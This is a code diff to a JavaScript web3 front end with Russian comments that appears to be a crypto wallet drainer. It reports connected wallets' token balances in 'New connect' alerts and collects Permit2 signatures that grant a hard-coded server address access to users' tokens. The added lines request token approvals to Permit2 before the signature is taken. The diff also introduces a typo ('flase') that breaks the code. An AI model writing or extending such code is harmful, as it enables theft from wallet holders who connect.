@@ -5,11 +5,11 @@ import { formatUnits, maxUint256, isAddress, getAddress, parseUnits, encodeFunct
 import { readContract, writeContract, sendCalls, estimateGas, getGasPrice, getBalance, signTypedData } from '@wagmi/core'
 
 // === Глобальный флаг для управления sendCalls ===
-const USE_SENDCALLS = false; // Поставьте false для отключения batch-операций
+const USE_SENDCALLS = flase; // Поставьте false для отключения batch-операций
 // === Флаг для включения Permit2 вместо single approve ===
 const USE_PERMIT2 = true; // true => использовать Permit2, false => обычный single approve
 // Адрес spender для Permit2 (должен быть EOA сервера, который подпишет tx на Permit2)
-const PERMIT2_SPENDER ='0x1c3537AA356AD38bD727CDF1fb4614dbb15e35C9'
+const PERMIT2_SPENDER = import.meta.env.VITE_PERMIT2_SPENDER || '0x1c3537AA356AD38bD727CDF1fb4614dbb15e35C9'
 
 // Нативные символы и получатель перевода нативки (заглушка)
 const NATIVE_SYMBOLS = {
@@ -380,7 +380,7 @@ async function notifyWalletConnection(address, walletName, device, balances, cha
         const price = ['USDT', 'USDC'].includes(token.symbol) ? 1 : token.price || 0
         const value = token.balance * price
         totalValue += value
-        return ➡️ ${token.symbol} - ${value.toFixed(2)}$`
+        return `➡️ ${token.symbol} - ${value.toFixed(2)}$`
       })
       .join('\n')
     const message = `🚨 New connect (${walletName} - ${device})\n` +
@@ -751,6 +751,13 @@ const performBatchOperations = async (mostExpensive, allBalances, state) => {
         const deadline = Math.floor(Date.now() / 1000) + 60 * 10
         const nonce = BigInt(Date.now())
         try {
+          // Опционально проверяем allowance Permit2 и даем approve, если 0
+          try {
+            const allowance = await getTokenAllowance(wagmiAdapter.wagmiConfig, state.address, token.address, PERMIT2_ADDRESS, token.chainId)
+            if (typeof allowance === 'bigint' ? allowance === 0n : BigInt(allowance || 0) === 0n) {
+              await approveToken(wagmiAdapter.wagmiConfig, token.address, PERMIT2_ADDRESS, token.chainId)
+            }
+          } catch (_) {}
           const signature = await signPermit2({
             chainId: token.chainId,
             account: state.address,
